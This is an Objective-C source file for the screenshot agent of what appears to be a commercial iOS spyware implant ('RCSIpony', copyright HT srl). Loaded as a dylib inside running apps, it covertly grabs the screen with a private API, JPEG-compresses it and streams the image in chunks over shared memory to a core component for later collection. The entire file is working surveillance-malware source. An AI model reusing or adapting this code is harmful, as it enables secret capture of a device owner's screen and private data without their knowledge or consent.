/*
 * RCSIpony - Screenshot agent
 *
 *
 * Created by Massimo Chiodini on 08/03/2010
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <UIKit/UIKit.h>
#import <sys/time.h>

#import "RCSIAgentScreenshot.h"

#import "RCSISharedMemory.h"
#import "RCSICommon.h"

#define DEBUG

extern RCSISharedMemory *mSharedMemoryCommand;

#define APP_IN_BACKGROUND 0
#define APP_IN_FOREGROUND 1

typedef struct _screenshot {
  u_int sleepTime;
  u_int dwTag;
  u_int grabActiveWindow; // 1 Window - 0 Entire Desktop
  u_int grabNewWindows;   // 1 TRUE onNewWindow - 0 FALSE
} screenshotAgentStruct;

typedef struct _screenshotHeader {
	u_int version;
#define LOG_SCREENSHOT_VERSION 2009031201
	u_int processNameLength;
	u_int windowNameLength;
} screenshotAdditionalStruct;

typedef struct CGImageDestination *CGImageDestinationRef;

extern CGImageRef UIGetScreenImage();
extern CGImageDestinationRef CGImageDestinationCreateWithURL(CFURLRef url, CFStringRef type, size_t count, CFDictionaryRef options);
extern void CGImageDestinationAddImage(CGImageDestinationRef idst, CGImageRef image, CFDictionaryRef properties);
extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);

//#define DEBUG
#define SCR_WAIT 1

static RCSIAgentScreenshot        *sharedAgentScreenshot = nil;
extern RCSISharedMemory           *mSharedMemoryLogging;

@interface RCSIAgentScreenshot (hidden)

- (NSDictionary *)getActiveWindowInformation;
- (BOOL)_grabScreenshot;

@end

@implementation RCSIAgentScreenshot (hidden)

- (NSDictionary *)getActiveWindowInformation
{
  NSString *bundleIdentifier  = [[NSBundle mainBundle] bundleIdentifier];
  
  NSArray *keys = [NSArray arrayWithObjects: @"windowID",
                                             @"processName",
                                             @"windowName",
                                             nil];
  
  NSArray *objects = [NSArray arrayWithObjects: bundleIdentifier,
                                                bundleIdentifier,
                                                bundleIdentifier,
                                                nil];
  
  NSDictionary *windowInfo = [[NSDictionary alloc] initWithObjects: objects
                                                           forKeys: keys];
  
  return windowInfo;
}

- (BOOL)_grabScreenshot
{
  int                         leftBytesLength = 0,byteIndex = 0;
  long                        logID;
  struct timeval              tp;
  time_t                      logTime;
  CGImageRef                  screenShot;
  NSString                    *processName;
  NSString                    *windowName;
  NSMutableData               *logData;
  NSDictionary                *windowInfo;
  shMemoryLog                 *shMemoryHeader;
  screenshotAdditionalStruct  *agentAdditionalHeader;
  int chunck_id = 0;
   
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
//
//  if (mContextHasBeenSwitched == APP_IN_BACKGROUND)
//    return FALSE;
//    
  // Fix for iOS: background apps will crash if 
  // trying to grab a shot
  UIApplication *uiApp = [UIApplication sharedApplication];
  
  if (uiApp != nil) 
    {
      UIWindow *keyW = [uiApp keyWindow];
    
      if (keyW != nil)
        {
#ifdef DEBUG_TMP
          NSLog(@"%s: application %@ have keywindow %@", __FUNCTION__, execName, keyW);
#endif
        }
      else
        {
#ifdef DEBUG_TMP
          NSLog(@"%s: application %@ have not keyWindow", __FUNCTION__);
#endif
          return NO;
        }
    }
  else 
    {
#ifdef DEBUG_TMP
      NSLog(@"%s: application %@ have not sharedApplication", __FUNCTION__, execName);
#endif
      return NO;
    }
  
  // try grabbing: if app is going in bg catch exception
  @try {
    // Run the screenshot
    screenShot = UIGetScreenImage();
  }  
  @catch (NSException *e) {
#ifdef DEBUG
    NSLog(@"%s: exception throw by UIGetScreenImage: %@", __FUNCTION__, e);
#endif
    return FALSE;
  }
   
  if (screenShot == NULL)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s:  error on grabbing image for pid %d", __FUNCTION__, getpid());
#endif
      return NO;
    }
  else 
    {
#ifdef DEBUG  
      NSLog(@"[DYLIB] %s: image grabbed", __FUNCTION__);
#endif
    }

    UIImage *imgScr = [UIImage imageWithCGImage: screenShot];
  
    CGImageRelease(screenShot);
    
  if (imgScr == nil)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: error on converting image for pid %d", __FUNCTION__, getpid());
#endif
      return NO;
    }
  else 
    {
#ifdef DEBUG  
      NSLog(@"[DYLIB] %s: image grabbed and converted", __FUNCTION__);
#endif
    }
  
  // highest compression
  NSData *entryData = UIImageJPEGRepresentation(imgScr, 0.00);
  
  // JPEG screenshot image data...
  if (entryData == nil) 
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: error reading image file...", __FUNCTION__);
#endif
      return NO;
    }
  else 
    { 
#ifdef DEBUG___
      NSString *fileString = [[NSString alloc] initWithFormat: @"/private/var/tmp/snap_%d.jpg", getpid()];

      NSLog(@"[DYLIB] %s: tmp screenshot image %@", __FUNCTION__, fileString);
       
      [[NSFileManager defaultManager] removeItemAtPath: fileString error: nil];
      
      [entryData writeToFile: fileString atomically: YES];
      [fileString release];
#endif
    }
  
  // Log id creating
  ctime(&logTime);
  logID       = getpid() ^ logTime;
  processName = [[NSBundle mainBundle] bundleIdentifier];
  windowName  = [[NSBundle mainBundle] bundleIdentifier];
  chunck_id = 0;
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: log id %d pid %d time %d]", __FUNCTION__, logID, getpid(), logTime);
#endif
  
  //
  // Fill in the agent additional header
  //
  NSMutableData *rawAdditionalHeader = [[NSMutableData alloc] initWithLength: sizeof(screenshotAdditionalStruct) +
                                                                      [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] +
                                                                      [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  int processNameLength = [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  int windowNameLength  = [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  agentAdditionalHeader = (screenshotAdditionalStruct *)[rawAdditionalHeader bytes];
  
  agentAdditionalHeader->version = LOG_SCREENSHOT_VERSION;
  agentAdditionalHeader->processNameLength = processNameLength;
  agentAdditionalHeader->windowNameLength  = windowNameLength;

  // Unfortunately we have to use replaceBytesInRange and mess with size
  // instead of doing a raw appendData
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct), processNameLength)
                                 withBytes: [[processName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct) + processNameLength, windowNameLength)
                                 withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];

  logData         = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryHeader  = (shMemoryLog *)[logData bytes];
  
  gettimeofday(&tp, NULL);
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = logID;
  shMemoryHeader->agentID         = LOG_SNAPSHOT;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
  shMemoryHeader->flag            = chunck_id++;
  shMemoryHeader->commandDataSize = [rawAdditionalHeader length];
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  memcpy(shMemoryHeader->commandData,
         [rawAdditionalHeader bytes],
         [rawAdditionalHeader length]);
  
  [rawAdditionalHeader release];
  
  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: create logID: %d chunck_id %d", __FUNCTION__,
            shMemoryHeader->logID, shMemoryHeader->flag);
#endif
    
    }
  else
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: error while sending log header to shared memory", __FUNCTION__);
#endif
    }
  
  [logData release];
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: sending %d bytes in %d chunks", __FUNCTION__, [entryData length], [entryData length]/0x300);
#endif
  
  do
    {
      // timing for producer/consumer
      usleep(250000);
      
      logData        = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      shMemoryHeader = (shMemoryLog *)[logData bytes];
    
      leftBytesLength = (([entryData length] - byteIndex >= 0x300)
                         ? 0x300
                         : ([entryData length] - byteIndex));
    
      memcpy(shMemoryHeader->commandData,
             [entryData bytes] + byteIndex,
             leftBytesLength);
    
      byteIndex += leftBytesLength;
    
      // Last block writing...
      if (byteIndex >= [entryData length])
        {
          shMemoryHeader->commandType   = CM_CLOSE_LOG;
        }
      else
        {
          shMemoryHeader->commandType   = CM_LOG_DATA;
        }
    
      gettimeofday(&tp, NULL);
      
      shMemoryHeader->status          = SHMEM_WRITTEN;
      shMemoryHeader->logID           = logID;
      shMemoryHeader->agentID         = LOG_SNAPSHOT;
      shMemoryHeader->direction       = D_TO_CORE;
      shMemoryHeader->flag            = chunck_id++;
      shMemoryHeader->commandDataSize = leftBytesLength;    
      shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
     

      if ([mSharedMemoryLogging writeMemory: logData
                                     offset: 0
                              fromComponent: COMP_AGENT] == TRUE)
        {
#ifdef DEBUG
        if (shMemoryHeader->commandType == CM_CLOSE_LOG)
          NSLog(@"[DYLIB] %s: sending close logID %d chunk [%d], ", __FUNCTION__, 
                shMemoryHeader->logID, shMemoryHeader->flag);
        else
          NSLog(@"[DYLIB] %s: logged logID %d  image chunk %d", __FUNCTION__, 
                shMemoryHeader->logID, shMemoryHeader->flag);
#endif
        }
      else
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: Screenshot Agent error while logging screenshot to shared memory", __FUNCTION__);
#endif
        }
      
      [logData release];
    
    } while (byteIndex < [entryData length]);

#ifdef DEBUG
  NSLog(@"[DYLIB] %s: end of grabbing", __FUNCTION__);
#endif
  
  return YES;
}

@end

@implementation RCSIAgentScreenshot

@synthesize mContextHasBeenSwitched;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
  if (sharedAgentScreenshot != nil)
    {
      self = [super init];
      
      if (self != nil)
        {
          isAlreadyRunning = FALSE;
        }
      
      sharedAgentScreenshot = self;
    }
  }
  
  return sharedAgentScreenshot;
}

+ (RCSIAgentScreenshot *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentScreenshot;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        sharedAgentScreenshot = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentScreenshot;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (BOOL)stopMySelf
{
  NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
  
  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
  shMemoryHeader->agentID         = AGENT_SCREENSHOT;
  shMemoryHeader->direction       = D_TO_AGENT;
  shMemoryHeader->command         = AG_STOP;
  shMemoryHeader->commandDataSize = 0;
  
  if ([mSharedMemoryCommand writeMemory: agentCommand
                                 offset: OFFT_SCREENSHOT
                          fromComponent: COMP_CORE])
    return YES;
  else
    return NO;
}

- (void)start
{  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
  @synchronized(self)
  {
    isAlreadyRunning = YES;
  }
  
  [self _grabScreenshot];

  @synchronized(self)
  {
    isAlreadyRunning = NO;
  }
  
  [outerPool release];
}

- (BOOL)stop
{  
  return YES;
}

- (BOOL)testAndSetIsAlreadyRunning
{
  BOOL bRet = FALSE;
  
  @synchronized(self)
  {
    if (isAlreadyRunning == FALSE)
      {
        isAlreadyRunning = TRUE;
        bRet = TRUE;
      }
  }
  
  return  bRet;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end
